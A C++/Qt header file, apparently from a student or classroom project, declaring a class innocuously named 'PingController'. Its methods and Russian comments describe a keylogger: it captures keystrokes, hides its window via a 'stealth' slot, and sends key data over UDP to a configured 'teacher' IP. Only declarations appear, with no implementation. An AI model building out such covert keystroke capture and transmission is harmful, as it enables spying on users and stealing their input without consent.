#ifndef PINGCONTROLLER_H
#define PINGCONTROLLER_H

#include <QUdpSocket>
#include <Windows.h>

class PingController : public QObject
{
    Q_OBJECT
public:
    PingController();

    bool is_capslock = false;

    int BackSp = 0;  //Переменная для BackSpace

    QString myAddress();    // узнаем свой IP

    // Для работы по UDP-протоколу в локальной сети
    QUdpSocket* socket;

    QString ip_ip = "0.0.0.0";  // необхожимо прописать нужный адрес преподавателя

public slots:
    // Отправляем данные с клавиатуры
    void sendKeylog();

    // формируем "сообщение" для отправки
    void strData(QString str, QString ip);

    // Видимость окна
    void stealth();

    int save(int key);
};

#endif // PINGCONTROLLER_H
